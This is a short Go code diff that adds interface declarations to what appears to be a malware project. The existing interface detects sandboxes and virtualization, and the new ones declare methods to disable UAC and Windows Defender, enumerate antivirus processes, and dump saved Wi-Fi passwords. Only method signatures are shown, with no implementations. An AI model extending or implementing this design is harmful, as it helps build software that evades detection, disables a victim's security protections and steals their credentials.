@@ -33,3 +33,13 @@ type EnvDetector interface {
     DetectSandbox() bool
     VirtualizationSystem() string
 }
+
+type AntiAVProvider interface {
+    DisableUAC()
+    DisableWDInitiate()
+    AvProcs()
+}
+
+type WifiProvider interface {
+    DumpWifiPasswords(mainFolder string) error
+}
